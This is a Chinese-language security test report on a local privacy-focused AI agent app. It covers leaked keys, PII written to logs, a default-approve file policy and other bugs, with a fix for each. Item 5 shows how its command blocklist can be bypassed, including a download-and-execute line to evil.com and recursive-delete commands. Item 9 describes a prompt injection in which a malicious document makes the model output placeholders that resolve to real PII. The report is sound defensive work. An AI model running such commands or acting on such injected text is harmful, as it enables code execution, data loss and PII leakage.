# 隐盾安全智能体 · 全面测试报告

> 测试日期：2026-08-23
> 测试对象：yindun-agent（V3.3 代码库，工作目录 `E:\yindun-agent`）
> 测试方式：通读核心源码约 15 个模块 → 运行现有 4 个测试套件（全部通过，但均为快乐路径）→ 自行编写 20 余项对抗性安全用例动态验证。
> 标注 ✅ 的条目均为**已实际复现**的问题（含复现脚本输出证据）；其余为代码审查结论。

---

## 🔴 P0 — 必须立即处理

### 1. 一行参数颠倒导致所有工具调用失败 ✅

- 定义：`audit_log.py:155` — `log_tool_result(self, tool_name: str, success: bool, result: str = "")`
- 调用：`agent_worker.py:757` — `AuditLog().log_tool_result(tool_name, str(tool_result)[:500], True)`

参数按 `(tool_name, 结果文本, True)` 传入后，内部执行 `result[:500]` 即 `True[:500]` 抛出
`TypeError: 'bool' object is not subscriptable`。该调用位于工具执行的 try 块内，异常被
`except` 捕获后 **把成功的工具结果覆盖为 `[工具执行错误] TypeError: ...`** 并标记失败；
连续 2 轮后 Agent 直接放弃回答。

影响范围：ReAct 循环中的所有工具（读文件 / 写文件 / 删除 / 搜索 / 知识库检索 / 附件分块读取…）。
仅强制注入路径（forced analyze_project）与两个 Worker 内部拦截的工具不受影响。
`agent_worker.py:763` 错误分支同样传反（错误文本进了 success 字段、False 进了 result 字段）。

推测为近期审计模块重构引入的回归；现有单测只测了 AuditLog 本身的正确用法，未覆盖调用方。

### 2. Fernet 主密钥已提交进 Git 并推送 GitHub ✅

- `git ls-files` 确认 `yindun/cache/.secret_key` 被跟踪，且历史已推送至 GitHub（Andysun06/yindun-agent）。
- 拿到仓库即可解密知识库 metadata 中全部映射密文，"双层加密"形同虚设。
- 处置建议：作废该密钥 → 用 BFG / git-filter-repo 清除历史 → 重新生成密钥。
- 另：`global_config.json` 中存在一个真实的智谱 API Key（明文）。虽被 `.gitignore` 排除，
  但已在多处暴露，建议作废重发。

### 3. 审计日志本身在泄露明文 PII ✅

- `agent_worker.py:368`：在 deanonymize **之后**记录 `log_llm_output(final_reply, preview=final_reply[:200])`，
  真实手机号等直接落盘 `audit_chain.json`（已复现）。与 README"审计只存脱敏预览，不落盘真实敏感数据"承诺相悖。
- `agent_worker.py:735`：`log_tool_call` 记录的 tool_args 是还原后的参数
  （668 行先 deanonymize → 审批 → 记日志），参数中真实 PII 一并落盘。

---

## 🟠 P1 — 安全架构缺陷

### 4. "沙箱"并不存在，策略默认放行 ✅

- `file_tools.py:26`：`target_directory` 接受任意绝对路径（`os.path.isabs(p)` 直接返回）。
- `policy_manager.py:189`：无规则匹配时默认返回 `"approve"`。
- 实测：向「启动」文件夹写 bat（持久化后门位置）→ approve；读桌面任意文档 → approve。
  仅 C:\Windows 拒绝、`.ssh/.aws/.env/credentials` 需审批、删除/执行需审批。
- 权限等级靠字符串匹配环境变量（如 `"彻底审计" in perm`），脆弱且无防篡改。

### 5. run_local_command：shell=True + 子串黑名单 ✅

- 黑名单为固定子串匹配（`format`、`rm -rf`、`del /s`…），实测可绕过面：
  - `cmd /c rmdir /s /q <dir>`（rmdir 不在黑名单）
  - `powershell -c "Remove-Item <dir> -Recurse"`
  - `curl http://evil.com/x.ps1 -o x.ps1; ./x.ps1`（下载执行）
- 更严重：高危审批弹窗 `confirm_dialog.py` 只显示"申请工具 / 目标路径"，
  **从不显示要执行的命令内容**——用户等于盲批。

### 6. 工作流完全绕过隐私网关 ✅

- `workflow.py:896-954`（analyze_contract / security_scan）：合同原文直接拼 prompt 发给 LLM，
  全程不经 PrivacyEngine。
- 当前配置使用云端 GLM API —— 合同中的手机号、身份证、金额会原样出网。
- 聊天链路的脱敏在工作流链路一概无效。

### 7. KeyManager 哈希链不覆盖 cipher_key ✅

- `key_manager.py` 的 `compute_hash()` 序列化字段不含 `cipher_key`。
- 实测：篡改 `key_store.json` 中密钥字段后 `verify_integrity()` 仍返回 True。
- 攻击者可静默替换密钥而不被完整性校验发现。

### 8. 多处明文落盘与产品宣传矛盾 ✅

| 泄露点 | 位置 | 说明 |
|---|---|---|
| 快速问答原始输入 | `agent_worker.py:291` | `update_with_context_result(self.user_input, ...)` 用未脱敏原文写入记忆 → `chat_sessions.json` 明文存 PII（ReAct 路径反而是脱敏态，两条路径不一致） |
| 附件全文原文 | `main_window.py:755` | `attachment_fulltext` 整体持久化到 session → 机密文档全文明文在磁盘 |
| 密钥文件权限 | `secret_manager.py:101` | Windows 下 `os.chmod(0o600)` 基本无效，实际全用户可读；应迁移 DPAPI/keyring |
| 密钥静默重建 | `secret_manager.py:71` | 密钥文件损坏时静默重新生成，旧加密映射全部不可解，UI 无任何告警 |

### 9. 占位符还原可被诱导利用 ✅

- LLM 回答中出现 `[PHONE_0]` 即被替换为真实值（deanonymize 对最终回复盲替换）。
- 攻击面：恶意文档可通过提示注入诱导模型输出占位符，把真实 PII 写进回复，
  进而写入工作流生成的报告文件、聊天导出等。
- 建议：deanonymize 仅对"本轮 anonymize 产生的占位符集合"做白名单还原。

---

## 🟡 P2 — 功能 Bug / 数据丢失

| # | 问题 | 位置 | 状态 |
|---|------|------|------|
| 10 | `modify_local_file` 按 20000 字符截断读取后整文件回写，**>20KB 文件一修改即丢尾部数据**（实测 25007 → 20009 字节） | `file_tools.py:283-293` | ✅ |
| 11 | 截断提示"可分段读取"，但 read_local_file 无分段参数 | `file_tools.py:256` | 审查 |
| 12 | URL 被当成盘符路径："分析 https://github.com/foo/bar" 解析出 `s:\github.com\foo\bar` 且强制覆盖所有工具目标目录；一条消息多个路径只取第一个 | `agent_worker.py:1355` (`_det`) | ✅ |
| 13 | 微信号等捕获组实体只替换第一次出现，同一标识符第二处裸奔 | `privacy_engine.py:257` | ✅ |
| 14 | 含点号的 API Key（智谱格式）只遮前半段，后半段明文发给 LLM（值正则 `[A-Za-z0-9]{16,}` 遇 `.` 截断） | `privacy_engine.py:112` | ✅ |
| 15 | 订单号等长数字串中间片段被误判为手机号（PHONE 无边界断言） | `privacy_engine.py:95` | ✅ |
| 16 | 重启后会话加载丢弃 `role:"tool"` 消息（工具链断裂）、不恢复 `box_mapping`（跨轮还原失效） | `main_window.py:938-952` | 审查 |
| 17 | 取消按钮并非真取消：线程池 `with` 块内 raise 后 `shutdown(wait=True)` 仍阻塞至 LLM 返回；若卡在审批 `_approved.wait()` 时取消则线程永久挂起 | `agent_worker.py:188-197, 709` | 审查 |
| 18 | 审批弹窗非模态且共用一个 Event：多工具同时待审批时，点任意一个弹窗 = 放行全部；弹窗文案永远写"越界敏感路径"，沙箱内删除也如此提示，误导安全判断 | `main_window.py:1078-1084`, `confirm_dialog.py` | 审查 |
| 19 | HTML 审计报告未做 HTML 转义，日志中 `<script>` / `onerror=` 原样进入导出报告（存储型 XSS） | `audit_log.py:430-436` | ✅ |
| 20 | `list_local_files` 对不存在目录会顺手 mkdir（读操作带写副作用）；审计日志每追加一条全量重写 JSON（O(n²)） | `file_tools.py:175`, `audit_log.py:121` | 审查 |

---

## 🔵 P3 — 工程规范

- 现有 4 个测试脚本在中文 Windows 默认 GBK 控制台下直接崩溃
  （emoji 输出触发 `UnicodeEncodeError`），必须手动 `PYTHONIOENCODING=utf-8` 才能运行。
- 仓库卫生：`temp_fix.py`（硬编码 `d:\` 路径的一次性补丁脚本）、
  `privacy_engine_old.py.bak`、重复的 `demo_contract.txt` 被提交；
  **`workflow_reports/` 内含真实合同审查业务数据，不应入库**。
- `启动.bat` 报错信息指向不存在的 `setup.bat`（实际是 `准备环境.bat`）；
  脚本标题 V3.2 与 README V3.3 不一致。
- `KeyManager` / `AuditLog` / `PolicyManager` 的 `_save()` 均为 `except: pass`，
  磁盘写入失败无任何感知。

---

## 👍 值得肯定的设计

- 模块解耦清晰，接口向后兼容意识好（anonymize/deanonymize 兼容旧版明文映射）。
- KB 入库即脱敏 + 映射表整体加密的双层设计思路正确。
- 哈希链审计方向正确（实现细节需加固）。
- 依赖缺失优雅降级；强制工具调用解决小模型偷懒问题，都是实战派做法。

主要症结：**调用方一致性缺失、"默认放行"的策略取向、以及"脱敏承诺"没有贯穿所有落盘路径。**

---

## 📈 优化路径（按优先级）

### 第一阶段 · 本周可完成
1. 修复 #1 参数顺序（两行改动），并补充调用方一致性回归测试。
2. 轮换两把已泄露密钥（Fernet 主密钥 + GLM API Key），用 BFG 清除 git 历史。
3. 统一"先脱敏再落盘"：审计 preview、tool_args、快速问答记忆三条路径。

### 第二阶段 · 权限模型重构
4. 策略改为 deny-by-default 白名单制：仅沙箱根目录及其子目录免审，越界一律 confirm。
5. `run_local_command` 弹窗必须展示完整命令内容 + 高危 token 高亮；
   可用 shlex 解析首 token 做 allowlist。
6. 工作流所有 LLM prompt 组装统一走 `anonymize → invoke → deanonymize` 管道函数，禁止旁路。

### 第三阶段 · 测试体系
7. 现有测试脚本 UTF-8 安全化输出并迁移 pytest。
8. 将本次对抗用例固化为回归测试（重点：#1 调用方一致性、#4 策略边界、#10 大文件修改）。
9. GitHub Actions：pytest + bandit / semgrep 静态扫描。
10. GUI 用 pytest-qt 补审批流、取消流的自动化测试。

### 第四阶段 · 产品化加固
11. 密钥迁移 Windows DPAPI 或系统 keyring。
12. deanonymize 增加"仅本轮占位符白名单"防注入还原。
13. 审计链加 HMAC（服务端或本地口令派生），或定期把链头哈希锚定到外部存储
    （否则攻击者整体重算哈希链即可伪造）。
14. HTML 报告导出统一 HTML escape。

---

## 附：本次测试覆盖范围说明

**已覆盖**：隐私引擎正则与映射安全、策略引擎边界、文件工具路径处理与数据完整性、
命令执行拦截逻辑、审计日志正确性与落盘内容、密钥管理三模块、会话持久化一致性、
取消/审批并发语义（静态）、git 仓库敏感数据扫描、现有测试套件运行。

**未覆盖（建议后续补测）**：
- GUI 实际交互（需 pytest-qt 或人工走查：审批弹窗堆叠、取消按钮、主题切换）
- 真实 LLM 端到端推理质量（需 Ollama 在线）
- OCR / 文档解析质量（PDF 扫描件、Word 表格还原度）
- 长时间运行的内存/日志增长表现
